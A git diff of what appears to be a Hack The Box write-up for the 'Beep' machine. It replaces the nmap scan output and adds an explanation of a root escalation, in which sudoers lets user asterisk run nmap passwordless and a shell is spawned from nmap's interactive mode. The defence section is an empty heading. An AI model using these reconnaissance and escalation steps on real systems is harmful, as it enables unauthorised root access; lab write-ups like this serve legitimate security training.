@@ -4,26 +4,31 @@ As always, I start by running nmap.
 
 While using my default parametres -sV and -sC, I did not get any response.
 
-So I tried -A which enables OS detection, version, detection, script scanning, and traceroute.
-And I also added -v which increases verbosity. Essentially just gives more details.
+So I tried -Pn which just treats all hosts as online.
 
 ```
-kali@kali:~/htb/Beep$ sudo nmap -A -v 10.129.84.71
-...
-...
-...
-Discovered open port 995/tcp on 10.129.84.71
-Discovered open port 25/tcp on 10.129.84.71
-Discovered open port 22/tcp on 10.129.84.71
-Discovered open port 443/tcp on 10.129.84.71
-Discovered open port 111/tcp on 10.129.84.71
-Discovered open port 110/tcp on 10.129.84.71
-Discovered open port 3306/tcp on 10.129.84.71
-Discovered open port 993/tcp on 10.129.84.71
-Discovered open port 80/tcp on 10.129.84.71
-Discovered open port 143/tcp on 10.129.84.71
-Discovered open port 10000/tcp on 10.129.84.71
-Discovered open port 4445/tcp on 10.129.84.71
+kali@kali:~/htb/Beep$ sudo nmap -Pn 10.129.84.71
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 11:30 EST
+Nmap scan report for 10.129.84.71
+Host is up (0.029s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+80/tcp    open  http
+110/tcp   open  pop3
+111/tcp   open  rpcbind
+143/tcp   open  imap
+443/tcp   open  https
+993/tcp   open  imaps
+995/tcp   open  pop3s
+3306/tcp  open  mysql
+4445/tcp  open  upnotifyp
+10000/tcp open  snet-sensor-mgmt
+
+Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
+
 ```
 We discover some interesting ports. 80 and 443 signals a website. So lets go check that out.
 
@@ -145,3 +150,50 @@ nmap> !sh
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 ```
+
+Why does this work?
+
+```
+cat /etc/sudoers
+## Sudoers allows particular users to run various commands as
+## the root user, without needing the root password.
+
+...
+...
+...
+
+asterisk ALL = NOPASSWD: /sbin/shutdown
+asterisk ALL = NOPASSWD: /usr/bin/nmap
+asterisk ALL = NOPASSWD: /usr/bin/yum
+asterisk ALL = NOPASSWD: /bin/touch
+asterisk ALL = NOPASSWD: /bin/chmod
+asterisk ALL = NOPASSWD: /bin/chown
+asterisk ALL = NOPASSWD: /sbin/service
+asterisk ALL = NOPASSWD: /sbin/init
+asterisk ALL = NOPASSWD: /usr/sbin/postmap
+asterisk ALL = NOPASSWD: /usr/sbin/postfix
+asterisk ALL = NOPASSWD: /usr/sbin/saslpasswd2
+uucp     ALL = NOPASSWD: /bin/chmod
+asterisk ALL = NOPASSWD: /usr/sbin/hardware_detector
+asterisk ALL = NOPASSWD: /sbin/chkconfig
+
+asterisk ALL = NOPASSWD: /usr/sbin/elastix-helper
+
+``` 
+Here we can see that the user asterisk, with all hosts has access to /usr/bin/nmap without having to use a password.
+
+And lets look at the privileges of nmap:
+
+```
+cd /usr/bin
+ls -la nmap
+-rwxr-xr-x 1 root root 528904 Jan  6  2007 nmap
+```
+We can see that the file is executable by everyone. As can be seen by the last x in the permissions. But it is owned by root. So when we run nmap, and then run a shell within nmap. we are essentially running as root.
+
+## Comparing to the official writeup:
+
+
+
+## How to stop this exploit:
+
